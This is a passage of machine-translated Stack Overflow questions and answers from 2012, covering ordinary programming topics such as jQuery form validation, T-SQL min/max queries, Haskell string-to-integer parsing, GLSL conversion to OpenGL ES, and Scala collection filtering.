由于它是一个简单的原型，每个选择将有 2 个选项。如果用户从 BOTH select 中选择第二个选项，然后触发提交，将显示一个隐藏的 div 并将屏幕滚动到它。

如果用户尝试在未选择这两个选项的情况下按下提交，则会在未选择的选项上方弹出错误消息

我在 html 上想像这样安静的东西

```
<style>
    .surprise {
        display: none;
    }
    .error {
        display: none;
    }
</style>

 <form>
     <select>
         <option>Please Select Your Value</option>
         <option>Pick this value 1</option>
     </select>
     <div class="error">Please select your value</div>

     <select>
         <option>Please Select Your Value</option>
         <option>Pick this value 2</option>
     </select>
     <div class="error">Please select your value</div>

     <input type="submit" value="Show Hidden Div" />         
 </form>

 <div class="suprise">
   Hidden Div
 </div> 
```

任何人都可以帮我一把吗？我的主要问题是获取这两个值然后输入将起作用，或者显示错误消息......

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T19:24:18.180

未测试：

```
 //add this id to submit or use your own

 $('#submit').click(function(){

   $('.error').hide();
   $('.surprise').hide();

   var correct = true;
   $('select').each(function(){
     // the option2value is presumed to always be the same as in <option value="option2value" >Text</option
     if($(this).val() != 'option2value'){
       //next is the error... it might be better to use an id there
       $(this).next().show();
       correct = false;
     }
   })
   if(correct){
     $('.surprise').show();
   }
 }) 
```

# drupal - 从 Drupal 中的面板显示将参数传递给视图

> ID：12646048
> 
> 赞同：2
> 
> 时间：2012-09-28T19:17:38.820
> 
> 标签：drupal, views, panels

目前我在 Drupal 中有一个内容类型，它是必须填写的字段列表。然后对该内容进行排序并显示它，我创建了一个视图，该视图从该内容类型导入所有字段，并按已发布和节点类型进行过滤。

此视图有一个 URL 和一个参数设置，用于根据内容字段之一过滤这些结果，而不是分类。例如，我声明这些记录是“当前”还是“过去”并且现在设置了参数，这样如果用户键入 URL/当前或 URL/过去，他们将看到视图显示相应的内容，无论是过去或现在。

我的目标是创建一个面板，该面板将在一个窗格中显示此视图，在左侧窗格中，有一个导航列表，其中包含指向 URL/过去 URL/当前等的链接，该列表将仅使用参数链接到同一面板页面. 然后可以将此参数传递给视图，分别更改它。

这可能吗？如果可以，怎么做？我已经在这个问题上工作了几天，我遇到的资源都是几年前的，而且没有帮助。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-04T08:38:36.357

面板页面应该接收虚拟路径元素，例如 my_page/%/% 并且窗格应该相应地将 %1 或 %2 发送到它们的视图。面板窗格视图显示可以在视图中创建，然后通过面板界面插入。可以在视图面板窗格显示配置中配置参数。

或者，您可以简单地创建一个接收和参数的视图，并在面板窗格中执行 *views_embed_view()* 设置为 PHP 过滤器 - 然后您可以简单地将*arg(1)*和*arg(2)*作为变量传递。

# c++ - Nsight 或其他适用于 Visual Studio 2012 (GeForce) 的 Direct3D 调试器/性能分析器？

> ID：12646056
> 
> 赞同：2
> 
> 时间：2012-09-28T19:18:20.193
> 
> 标签：c++, visual-studio, directx, visual-studio-2012, nsight

我正在为 Visual Studio 2012 寻找任何类型的 Direct3D 10/11 调试器/性能分析器。

我发现了一个名为 NVidia PerfHUD 的非常好的应用程序，但我注意到它已经贬值了。

新的是 NVidia Nsight。不幸的是，它是为 Visual Studio 2008/2010 设计的。

有没有**将 NVidia Nsight 连接到 Visual Studio 2012 的**选项？

如果没有，**是否有任何其他该类型的程序**（易于使用的监视器可以让我检查 Direct3D C++ 应用程序的性能）？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T22:50:19.040

我自己没有尝试过，（使用 VS2010 并且还没有移动到 2012），但它表明 Visual Studio 2012 中集成了对 DX 调试的支持。

看看[这里](http://blogs.msdn.com/b/vcblog/archive/2011/11/08/10235150.aspx)：

# java - 下载 Eclipse 源代码

> ID：12646058
> 
> 赞同：2
> 
> 时间：2012-09-28T19:18:53.453
> 
> 标签：java, eclipse, cvs

在此问题因重复而被阻止之前，我想提一下，这是对上一个问题的扩展：[下载 Eclipse 的源代码](https://stackoverflow.com/questions/2890757/downloading-eclipses-source-code)

这就是我需要的：我正在从事一个关于开源项目随时间演变的研究项目。我专注于 Eclipse 的主要版本（例如 3.4、3.5、3.6 等）。因此，我需要 Eclipse IDE（和仅 IDE）的源代码，用于我想到的特定版本（例如，它们之间有一些时间间隔的版本等）（而不是所有主要/次要版本）。

上述问题的公认答案表明我可以下载整个 ~7 GB 文件并选择特定版本。相反，有没有办法可以下载特定版本的 Eclipse IDE 源代码？例如，Apache 为每个项目的每个版本维护一个 zip 文件：http: [//archive.apache.org/dist/](http://archive.apache.org/dist/)

我添加了上述问题中提到的存储库，正如提问者所说，我也对我无法理解要下载哪些模块（对应于 IDE）的不同模块的数量感到困惑。

注意：我偶然发现了这个 Eclipse 构建页面：http: [//archive.eclipse.org/eclipse/downloads/index.php](http://archive.eclipse.org/eclipse/downloads/index.php)。我可以从这个页面获取特定版本的 IDE（并且只有 IDE）的源代码吗？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-09-28T19:37:25.687

Eclipse SDK 附带 Source 包。这些捆绑包包含用于该版本的源代码，但您无法真正构建它们来获取 IDE。提供这些是为了让开发人员在开发自己的应用程序时可以查看/使用源代码。

根据您在研究项目中尝试执行的操作，这些捆绑包可能就足够了。例如，如果您想做一些分析技术或代码度量，您可能只使用这些。您可以从[存档服务器](http://archive.eclipse.org/eclipse/downloads/)下载旧的 SDK 。

如果这还不够，并且您需要重新创建用于每个版本的确切源代码，则需要克隆 Git 存储库并签出与每个版本关联的标签。这会很复杂，因为仅 IDE 就有大约 22 个不同的源代码库。这是[repos 列表的](http://git.eclipse.org/c/platform/eclipse.platform.releng.maps.git/tree/org.eclipse.releng/tagging/repositories.txt)链接。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T19:33:25.050

下载适当的“Eclipse SDK”包——它们是具有完整源代码的 Eclipse 平台 + Java 工具 + 插件工具。

# sql - 如果可能，布尔表达式的最小值/最大值为 null？

> ID：12646063
> 
> 赞同：0
> 
> 时间：2012-09-28T19:19:08.443
> 
> 标签：sql, tsql, sql-server-2005, boolean

是否可以将具有最大值或最小值的布尔表达式放入 nullif() 语句中？

例如

```
select 
    min(a) as b ---grabbing first value
    ,max(a) as  c --- grabbing last value but could be same as min value, this is the problem
    ,nullif(min(a), (min(a) = max(a))) ---my idea for a solution that didnt work
   from table 
```

当字段的值仅发生 1 次时，尝试清除重复的行。我在想可能有一种方法可以通过计数然后清除所有值超过 1 的值来做到这一点，但我不确定如何实现这一点。在 sql server 2005 上工作，如果可能的话，在 t-sql 中需要这个，任何可以在服务器上工作的东西都可以。

编辑以提供更多信息：我正在查看订单管理系统中订单的状态历史记录，该系统在每次请求更正时使用 ID 进行标记。id 是唯一的和数字的。在这种格式 1234 中，每个 orderid 都是唯一的和数字的，在这种格式 1111111.2 中也是如此。a 表示唯一的校正 ID。我想看看订单，如果一个更正 id 已经碰巧抓住了下一个，那么如果可能的话，接下来是下一个，依此类推。至少我想要 MAX 值和 MIN 值。我不能只做两列，因为那样会两次计算最小值（使用我的例子）并且不会给我准确的数据

我的例子试图简单，但它没有提供足够的信息，这里有更多：

```
SELECT Cast(oi.orderid AS VARCHAR(MAX)) + '.' 
                 + Cast(oi.orderitemid AS VARCHAR(MAX)) AS OrderNumber,
       Min(oici.orderitemcorrectionid)                  AS a,
       Max(oici.orderitemcorrectionid)                  AS b
FROM   Orderitems oi
       LEFT JOIN orderitemcorrections oic
         ON oic.orderid = oi.orderid
            AND oic.orderitemid = oi.orderitemid
       LEFT JOIN orderitemcorrectionissues oici
         ON oici.orderitemcorrectionid = oic.orderitemcorrectionid
       LEFT JOIN correctiontypes ct
         ON ct.correctiontypeid = oici.correctiontypeid
GROUP  BY Cast(oi.orderid AS VARCHAR(MAX)) + '.' 
                   + Cast(oi.orderitemid AS VARCHAR(MAX)) 
```

上述查询的样本表数据：

```
OrderNumber a   b
1098048.1   1   2
1098210.1   160 160
1098222.1   78  78
1098300.1   31  31
1098408.1   4   4
1098462.1   224 224
1098468.1   602 602
1098492.2   1457 1457 
```

上面是 a 和 b 相同的数据，下面是它们不同的地方，但我想将 a 到 b 的任何重复项归零

```
1100268.1   181 191
1100256.1   306 379 
```

更多数据，未分组以显示行的重复项。-- 样本原始数据

```
OrderNumber orderitemcorrectionid
1098048.1   1
1098048.1   2
1098210.1   160
1098210.1   160 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T20:29:45.363

您可以使用 UNION 来实现无效化，它会删除重复的行。我会这样做

```
;with tmp AS (
    select
    CAST(oi.orderid as VARCHAR(MAX))+'.'+CAST(oi.orderitemid as VARCHAR(MAX)) as OrderNumber
    ,min(oici.orderitemcorrectionid) as a
    ,max(oici.orderitemcorrectionid) as b

    FROM
    Orderitems oi
    left join orderitemcorrections oic on oic.orderid = oi.orderid and oic.orderitemid = oi.orderitemid
    left join orderitemcorrectionissues oici on oici.orderitemcorrectionid = oic.orderitemcorrectionid
    left join correctiontypes ct on ct.correctiontypeid = oici.correctiontypeid
    GROUP BY 
    CAST(oi.orderid as VARCHAR(MAX))+'.'+CAST(oi.orderitemid as VARCHAR(MAX))
)
select OrderNumber, a
from tmp
union
select OrderNumber, b
from tmp 
```

这将 a's 和 b's 放入不同的行，Union 负责删除重复项。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:31:55.827

可能是这样的：

```
SELECT Cast(oi.orderid AS VARCHAR(MAX)) + '.' 
                 + Cast(oi.orderitemid AS VARCHAR(MAX)) AS OrderNumber,
       COALESCE(Min(oici.orderitemcorrectionid),Max(oici.orderitemcorrectionid),0) AS a,
       COALESCE(Max(oici.orderitemcorrectionid),Min(oici.orderitemcorrectionid),0) AS b
FROM   Orderitems oi
       LEFT JOIN orderitemcorrections oic
         ON oic.orderid = oi.orderid
            AND oic.orderitemid = oi.orderitemid
       LEFT JOIN orderitemcorrectionissues oici
         ON oici.orderitemcorrectionid = oic.orderitemcorrectionid
       LEFT JOIN correctiontypes ct
         ON ct.correctiontypeid = oici.correctiontypeid
GROUP  BY Cast(oi.orderid AS VARCHAR(MAX)) + '.' 
                   + Cast(oi.orderitemid AS VARCHAR(MAX)) 
```

但是，我可能会误解，所以请善待。

# scala - 如何根据某些条件构建新的 Set？

> ID：12646067
> 
> 赞同：1
> 
> 时间：2012-09-28T19:19:26.590
> 
> 标签：scala, scala-collections

我试图学习 scala 的基础知识并处理集合操作。我还没有找到很多关于迭代读取 scala 集和创建新集的数据。

我正在做的基本任务是遍历 Set 的内容并选择一些满足条件的值并从中创建一个新的集合。

所以想法基本上是这样的

```
for all elements in Set
    if (condition) add element to set
    else discard element 
```

任何有关此类语句语法的帮助将不胜感激。谢谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T19:21:24.520

```
set.filter (condition) 
```

应该返回一组新的元素，满足条件。

它与 for 的语法相同

```
vector.filter (condition)
array.filter (condition)
map.filter (condition)
list.filter (condition) 
```

等等。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-28T19:24:15.623

为此使用`filter`方法`Set`。例如，如果你有`set: Set[Int]`并且你想过滤所有偶数，你会做类似的事情

```
set.filter(x => x % 2 == 0) 
```

# php - ing src 中的 PHP 变量

> ID：12646069
> 
> 赞同：0
> 
> 时间：2012-09-28T19:19:35.703
> 
> 标签：php

> **可能重复：**
> [将 Img 源与 php 变量一起使用](https://stackoverflow.com/questions/12645493/use-img-source-with-php-variable)

我在这里有一个小问题，我相信这是一个简单的问题，但我在 php 方面非常糟糕。

我正在使用一个 WP 插件，它会在某个时刻拉出附加到帖子的第一张图片，在我的例子中，是用户在提交业务时上传的图片（它是一个业务目录插件）。

我不想那样，相反，我想要 thumbshots.com 生成的缩略图。我的代码如下所示（我替换了*$thumbnail*的默认值）：

```
if (!$thumbnail && wpbdp_get_option('use-default-picture'))

$thumbnail = 'http://images.thumbshots.com/image.aspx?cid=HIPFHapOLHw%3d&v=1&w=283&url=URLHERE'; 
```

现在，应该放置一个实际的 URL，而不是 URLHERE，即列表的 URL。这是由此创建的：

```
<?php echo wpbusdirman_the_listing_meta('single'); ?> 
```

我该怎么做？

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-28T19:26:53.557

```
$thumbnail = 'http://images.thumbshots.com/image.aspx?cid=HIPFHapOLHw%3d&v=1&w=283&url=' . wpbusdirman_the_listing_meta('single'); 
```

或者

```
$thumbnail = "http://images.thumbshots.com/image.aspx?cid=HIPFHapOLHw%3d&v=1&w=283&url=$wpbusdirman_the_listing_meta('single'); 
```

?

阅读： http: [//phphowto.blogspot.com/2006/12/concatenate-strings.html](http://phphowto.blogspot.com/2006/12/concatenate-strings.html)

# javascript - 有没有办法在 Jquery 链接语句中添加 x 元素作为新创建元素的子元素？

> ID：12646072
> 
> 赞同：0
> 
> 时间：2012-09-28T19:19:44.010
> 
> 标签：javascript, jquery, for-loop, chaining, createelement

我正在使用以下内容：

```
 var topWrapper = $('<div />')
    .addClass( 'table-top-wrapper ui-corner-top ui-body-'+o.wrapperTheme )
    .grid({ grid: this.options.grid })
    .append(container)
    .insertBefore(table); 
```

并且需要在`x`调用.`div``.grid`

说`x=3`有没有办法将`x`子 div 的数量附加到链中新创建的 div 元素？像可链接的东西`for-loop`？

感谢您的见解！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-28T19:36:20.663

您可以创建一个元素数组并追加：

```
var x = 3;

var topWrapper = $('<div />')
.addClass( 'table-top-wrapper ui-corner-top ui-body-'+o.wrapperTheme )
.append($.map(new Array(x), function(){
  return $('<div/>');
}))
.grid({ grid: this.options.grid })
.append(container)
.insertBefore(table); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-28T19:32:45.923

您可以像这样创建自己的 jQuery 扩展：

```
$.fn.appendMultipleChildren = function(child, repeat) {
    var $this = $(this);
    for (var i = 0; i < repeat; i++) {
        $this.append(child.clone());
    }
    return $this;
} 
```

然后打电话

```
 var topWrapper = $('<div />')
    .addClass( 'table-top-wrapper ui-corner-top ui-body-'+o.wrapperTheme )
    .grid({ grid: this.options.grid })
    .appendMultipleChildren($('<div />'), 3)
    .append(container)
    .insertBefore(table); 
```

**编辑**- 这是一个 jsfiddle 示例：http: [//jsfiddle.net/eJGxm/](http://jsfiddle.net/eJGxm/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T19:28:26.430

最有效的方法是将它们组装成一个字符串，然后调用`jQuery.html`. 不过，这不会使循环可链接。如果你真的想这样做，你可以将它们包装在一个函数中：

```
topWrapper = $('<div />')
    .addClass( 'table-top-wrapper ui-corner-top ui-body-'+o.wrapperTheme )
    .html((function(){
       var markup = '';
       for (var i =0; i < 3; i++) {
         markup .= '<div></div>';
       }
       return markup;
    })())
    .grid({ grid: this.options.grid })
    .append(container)
    .insertBefore(table); 
```

就个人而言，尽管我发现在进行 topWrapper 调用之前比执行循环更难阅读。

# ms-access - 安装了 MS-Access 2003 和多个 Office 版本的 Windows 7 中的 Showplan.out？

> ID：12646075
> 
> 赞同：2
> 
> 时间：2012-09-28T19:20:03.030
> 
> 标签：ms-access, logging, registry, jet

我正在寻找一种方法来记录来自包含前端和后端的第 3 方专有 ms-access 数据库应用程序的查询。

该数据库在 MS-Access 2003 中运行。我阅读并遵循了[该问题的答案中](http://www.techrepublic.com/article/use-microsoft-jets-showplan-to-write-more-efficient-queries/5064388)建议的[文章](https://stackoverflow.com/questions/153053/microsoft-jet-sql-query-logging-or-how-do-i-debug-my-customers-program)中提到的说明，目的是创建 showplan.out 文件以找出查询正在访问哪些表。

找到文章中指定的注册表项时：`\\HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\JET\4.0\Engines`我注意到路径不存在于 之外`JET`，因此我创建了路径的其余部分，包括将`DEBUG`其值设置为 的键`ON`。

我也知道我正在使用的 Office 安装安装了多个版本的 Office / Access（2003 和 2010），并且过去有人在我到达这里之前可能使用注册表黑客来启用这两个版本的安装。

哦，`Showplan.out`应该出现的“我的文档”也存储在外部漫游配置文件服务器上。

是否有可能以`Showplan.out`其他方式在 Windows 7 64 位上获得输出，或者我最好在干净的 VM 上安装 Office，复制我的数据库，然后从那里尝试？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T20:20:21.907

```
Debug.Print CurDir 
```

这将打印 Access 看到的当前工作目录。那是您可以找到 showplan.out 的地方。默认情况下，这将是您的“我的文档”目录，但不能保证。

~~看起来您在 Windows 注册表中设置了正确的路径和键。~~ 我相信@Remou 在他的评论中链接到的位置适用于 Access 2007 及更高版本（即 .accdb 文件）。

**更新：**由于您使用的是 Windows 64，因此实际的注册表项应该是这样的：

```
[HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Jet\4.0\Engines\Debug]
"JETSHOWPLAN"="ON" 
```

# java - java垃圾收集-暂停应用程序线程？

> ID：12646078
> 
> 赞同：0
> 
> 时间：2012-09-28T19:20:08.603
> 
> 标签：java, garbage-collection

应用程序线程停止的总时间：xxxxxxxxx 应用程序时间：xxxxxxxxxxxxxxx

这两个字段是什么意思？我的应用程序是否正在为 gc 暂停？申请时间字段是什么意思？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-28T19:21:04.823

是的，根据您使用的 GC 算法，您的应用程序线程可能会在 GC 时停止。

根据[使用 5.0 调整垃圾收集，第 5.4 节](http://www.oracle.com/technetwork/java/gc-tuning-5-138395.html)：

> 对于每个主要收集，并发收集器将在收集开始到收集中间暂停所有应用程序线程一小段时间

**应用时间：**在垃圾回收之外花费的时间（简称应用时间）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T19:22:27.753

有两种类型的 GC，一种是阻塞，另一种是线程。您可以在这里找到一些详细信息：[GC 类型](http://javarevisited.blogspot.hu/2011/04/garbage-collection-in-java.html)

# list - 有一个字符串列表，但需要一个整数列表

> ID：12646082
> 
> 赞同：1
> 
> 时间：2012-09-28T19:20:40.377
> 
> 标签：list, haskell

我有一个里面有一个字符串的列表，我需要用 Char 解构 Char 并将其作为 Integer 放入一个列表中，但是我被这些类型所阻碍

我有一个 txt 文件，我读入 monad：

```
getTxt = do
  y <- readFile "foo.txt"
  return y 
```

`foo`只包含这个：

```
"1234567890\n" 
```

然后我以为我很接近序列，但这让我得到了这个列表：

```
["1","2","3","4","5","6","7","8","9","0"] :: [[Char]] 
```

但我需要`[Integer]`。`ord`将采取`Char -> Int`，但我怎么读`[Char] -> [Int]`？在所有这些试验和唯一的错误之后，我不需要最后过滤掉最后的新行吗？

有什么建议么？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-28T21:33:00.360

如果您使用`ord`，则类型匹配，但这不是您想要的，因为`ord`给您的是 ascii 值，而不是数值：`ord 5`is `53`， not `5`。您可以减去 48 来获得数字，然后将数字累加成一个数字，但使用库函数会更容易。最直接的选择是`read`：

```
getInt :: IO Integer
getInt = do
    y <- readFile "foo.txt"
    return (read (takeWhile (/='\n') y)) 
```

与[链接的答案](https://stackoverflow.com/questions/2468410/convert-string-to-integer-float-in-haskell)一样，这里最好的解决方案是使用`reads`.

`reads`找到一个可能匹配的列表，作为对`(match,remainingstring)`，这对你很有效，因为它会自动将换行符留在剩余的字符串中，

`*Main> reads "31324542\n" :: [(Integer,String)]`
`[(31324542,"\n")]`

让我们使用它：

```
findInt :: String -> Maybe Integer
findInt xs = case reads xs of              -- have a look at reads xs
    ((anint,rest):anyothers) -> Just anint -- if there's an int at the front of the list, just return it
    _ -> Nothing                           -- otherwise return nothing 
```

`Maybe`'一种方便的数据类型，可以让您在不崩溃程序或进行异常处理的情况下发生故障。 `Just 5`意味着你得到了输出，它是`5`. `Nothing`表示有问题，没有输出。

```
addTen :: FilePath -> IO ()
addTen filename = do
    y <- readFile filename
    case findInt y of 
       Just i -> putStrLn ("Added 10, got "++show (i+10))
       Nothing -> putStrLn ("Didn't find any integer at the beginning of " ++ filename) 
```

这给了你：

`*Main> addTen "foo.txt"`
`Added 10, got 1234567890`

* * *

如果你只想要字符代表的整数，你可以放在`import Data.Char`文件的顶部并做

```
ordzero = ord '0'   -- handy constant, 48, to unshift the ascii code to a digit.

getInts :: FilePath -> IO [Int]          -- ord gives the smaller Int, not Integer
getInts filename = do
    y <- readFile filename
    return [ord achar - ordzero | achar <- takeWhile isDigit y] 
```

`y`只要字符串的字符是数字，这就会获取字符串的字符，然后找到它们的`ord`，减去`ord '0'`（即 48）`'4'`变成`4`等。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-28T20:11:04.113

阅读`map`和的文档`filter`。它非常重要。在你的情况下

```
integersFromFile :: String -> IO [Int]
integersFromFile filename = map digitToInt <$> readFile filename 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-28T20:40:06.543

我不确定我理解你在说什么，但我认为幻觉生活所暗示的版本是列表理解......

```
do cs <- readFile "foo.txt"
   return [ord c | c <- cs, c /= '\n'] 
```

这有点作弊 - 它假定文件将只包含数字和行尾，并且只要出现任何行尾字符就会去掉它们。

解释 - 这是一个[列表理解](http://www.haskell.org/haskellwiki/List_comprehension)。`c <- cs`基本上`c`依次分配每个字符。过滤掉带有 line-end的`c /= '\n'`案例（无论它发生在哪里 - 它不必在最后）。`ord c`给出要包含在最终列表中的值。

这可以使用`filter`and来表达`map`，但是一旦你习惯了它，列表推导式会更方便。

改进的版本可能会使用`isDigit`（来自[Data.Char](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Data-Char.html)）来检查字符。[也许](http://www.haskell.org/ghc/docs/latest/html/libraries/base/Data-Maybe.html)还有一种方法可以跟踪列表中是否存在无效字符，因此您可以稍后检查并报告这些标记或将它们过滤掉。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T21:43:41.237

所以你想要一个具有这种类型的函数：

```
charsToInts :: [Char] -> [Int] 
```

我们可以通过将问题分解为更小的问题来解决这个问题。首先，我们需要一个将 single 转换为 a 的`Char`函数`String`：

```
charToString :: Char -> String
charToString c = [c] 
```

...然后我们需要一个将 a 转换为 a 的`String`函数`Int`：

```
stringToInt :: String -> Int
stringToInt = read 
```

...然后我们组合这两个函数以获得将`Char`s 转换为`Int`s 的函数：

```
charToInt :: Char -> Int
charToInt = stringToInt . charToString 
```

现在，我们可以使用以下方法提升该函数来处理整个`Char`s列表`map`：

```
charsToInts :: [Char] -> [Int]
charsToInts = map charToInt 
```

......我们完成了！

出于演示目的，我采取了一条非常冗长的路径。在我自己的代码中，我通常会像这样内联所有这些定义：

```
charsToInts :: [Char] -> [Int]
charsToInts = map (read . singleton)
  where singleton x = [x] 
```

要`stringsToInts`在您的代码中使用，您只需编写：

```
getTxt :: IO [Int]
getTxt = fmap charsToInts $ readFile "foo.txt" 
```

这`fmap`适用`charsToInts`于 的结果`readFile`，上面的代码等价于：

```
getTxt = do
    chars <- readFile "foo.txt"
    return $ charsToInts chars 
```

【外界评论：

您可以通过列表理解进一步减少它：

```
getTxt :: IO [Int]
getTxt = do
    chars <- readFile "foo.txt"
    return [read [d] | d <- chars] 
```

请注意，虽然顶级函数的类型注释通常是一个好主意，但在这种情况下它是强制性的（除非您将注释放入函数体中）。那是因为“读取”否则不知道您想要什么类型。]

# opengl - 如何从 OpenGL GLSL 代码转换为 OpenGL ES GLSL 代码

> ID：12646086
> 
> 赞同：1
> 
> 时间：2012-09-28T19:20:56.787
> 
> 标签：opengl, opengl-es, glsl

我正在尝试将 opengl 的 glsl 转换为 opengl es 的 glsl。

这是我要翻译的 glsl 代码。

*   对于顶点着色器

    ```
    varying vec2 texcoord0;
    varying vec2 texcoord1;
    varying vec2 texcoord2;
    varying vec2 texcoord3;
    varying vec2 texcoord4;
    varying vec2 texdim0;

    varying vec2 texcoordLUT;

    uniform float sharpness;

    void main()
    {
        gl_Position = ftransform();

        texcoord0 = vec2(gl_TextureMatrix[0] * gl_MultiTexCoord0);
        texcoordLUT = vec2(gl_TextureMatrix[1] * gl_MultiTexCoord1);
        texdim0 = vec2 (abs(gl_TextureMatrix[0][0][0]),abs(gl_TextureMatrix[0][1][1]));

        texcoord1 = texcoord0 + vec2(-sharpness, -sharpness);
        texcoord2 = texcoord0 + vec2(+sharpness, -sharpness);
        texcoord3 = texcoord0 + vec2(+sharpness, +sharpness);
        texcoord4 = texcoord0 + vec2(-sharpness, +sharpness);

    } 
    ```

*   对于片段着色器

    ```
    uniform float amount;
    uniform float vignette;

    uniform sampler4DRect tex0;
    uniform sampler1D tex1;

    varying vec2 texcoord0;
    varying vec2 texcoord1;
    varying vec2 texcoord2;
    varying vec2 texcoord3;
    varying vec2 texcoord4;

    varying vec2 texdim0;

    varying vec2 texcoordLUT;

    const vec4 one = vec4(1.0); 
    const vec4 two = vec4(2.0);
    const vec4 lumcoeff = vec4(0.299,0.587,0.114, 0.);

    vec4 vignetteFucntion(vec2 normalizedTexcoord)
    {
        normalizedTexcoord = 2.0 * normalizedTexcoord - 1.0;
        float r = length(normalizedTexcoord);
        return 1.0 - vec4(smoothstep(0.5,1.0,r)) + 0.5;
    }

    vec4 hardlight(vec4 a, vec4 b, float amount)
    {
        vec4 result;
        vec4 branch1;
        vec4 branch2;
        float luminance = dot(b,lumcoeff);
        float mixamount;

        mixamount = clamp((luminance - 0.45) * 10., 0., 1.);
        branch1 = two * a * b;
        branch2 = one - (two * (one - a) * (one - b));

        result =  mix(branch1,branch2, vec4(mixamount));

        return mix(a,result, amount);
    }

    void main (void) 
    {       
        vec2 normcoord = texcoord0/texdim0;

        vec4 vignetteResult = vignetteFucntion(normcoord);

        vec4 input0 = texture2DRect(tex0, texcoord0);
        vec4 input1 = texture2DRect(tex0, texcoord1);
        vec4 input2 = texture2DRect(tex0, texcoord2);
        vec4 input3 = texture2DRect(tex0, texcoord3);
        vec4 input4 = texture2DRect(tex0, texcoord4);

        vec4 sharpened = 5.0 * input0 - (input1 + input2 + input3 + input4);

        vec4 hardlighted = hardlight(sharpened,input0, .5);

        vec4 saturated = mix(vec4(dot(hardlighted,lumcoeff)), hardlighted, 0.75);

        vec4 result;

        result.r = texture1D(tex1, saturated.r).r;
        result.g = texture1D(tex1, saturated.g).g;
        result.b = texture1D(tex1, saturated.b).b;
        result.a = saturated.a;

        gl_FragColor = mix(input0, result *  (mix(vec4(1.0),vignetteResult, vignette)),amount);
    } 
    ```

我想知道如何翻译 gl_TextureMatrix[0]、gl_TextureMatrix[1] 和 gl_TextureMatrix[0][0][0]。他们的意思是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-28T19:30:03.450

gl_TextureMatrix 是一个变换纹理坐标的变换矩阵（例如，如果您想在静态形状上旋转或缩放纹理。

它是标准 OpenGL 中已弃用的内置变量。在现代 OpenGL/OpenGLES 中处理这个问题的正确方法是声明你自己的统一矩阵而不是使用内置`gl_TextureMatrix`的`GL_TEXTURE_MATRIX`.

# javascript - 如果没有块范围，独立块的意义何在？

> ID：12646097
> 
> 赞同：2
> 
> 时间：2012-09-28T19:21:39.097
> 
> 标签：javascript, syntax, lexical-scope

> 您可以使用这样的独立积木......

```
var something = 1;
{
  var something = 2;
  print("Inside: " + something);
}
print("Outside: " + something); 
```

这来自：[http ://eloquentjavascript.net/chapter3.html#p3c7ae609](http://eloquentjavascript.net/chapter3.html#p3c7ae609)

但是有这样的块有什么意义呢？它的用途是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-28T19:23:49.190

在 ES6 中会有用 声明的块范围变量`let`，在这些变量中，独立的块将不再毫无意义。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-28T19:25:22.560

独立块通常不会在脚本中添加任何值，但是它们*可以*用于代码组织，例如拆分方程式：

[一条线：]

```
//long equations are hard to read
foo = bar * baz + fizz - buzz; 
```

[堵塞：]

```
{
    //this groups relevant information into a descrete section
    foo = bar;
    foo *= baz;
    foo += fizz;
    foo -= buzz;
} 
```

虽然，基于一组标准输入执行操作的长方程通常分解成它们自己的函数：

[作为函数：]

```
function qux(bar, baz, fizz, buzz) {
    var ret;
    ret = bar;
    ret *= baz;
    ret += fizz;
    ret -= buzz;
    return ret;
}

foo = qux(bar, baz, fizz, buzz); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-28T19:23:39.407

哎呀，我一直在读，这是我的答案：

> 事实上，虽然允许这样的块，但它们完全没有意义。

[http://eloquentjavascript.net/chapter3.html#p6f53387f](http://eloquentjavascript.net/chapter3.html#p6f53387f)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-28T19:24:11.330

你是在自问自答。从 OP 中链接的文章：

> 事实上，虽然允许这样的块，但它们完全没有意义。

# scala - 实现这个简单的类拆分函数的惯用 scala 方式

> ID：12646099
> 
> 赞同：1
> 
> 时间：2012-09-28T19:21:52.050
> 
> 标签：scala, haskell

我想实现一个具有以下特征的函数：

*   将一个`array`( `Array[A]`) 和一个`pieces`要返回的 ( `Int`) 作为参数
*   返回`array`分成`pieces`几部分的数组。
*   如果可能，所有部分的长度都应该相等，否则第一个应该比最后一个长一个元素（如果 的长度`array`不是 的倍数`pieces`）

在 Haskell 中，我会按照这些思路编写一些代码：

```
split :: [a] -> Int -> [[a]]
split list pieces = go list (length list `div` pieces)
 where
  go xs n | l > n && m == 0 = take n xs : go (drop n xs) n
          | l > n           = take (n + 1) xs : go (drop (n + 1) xs) n
          | otherwise       = [xs]
   where
    l = length xs
    m = l `mod` n 
```

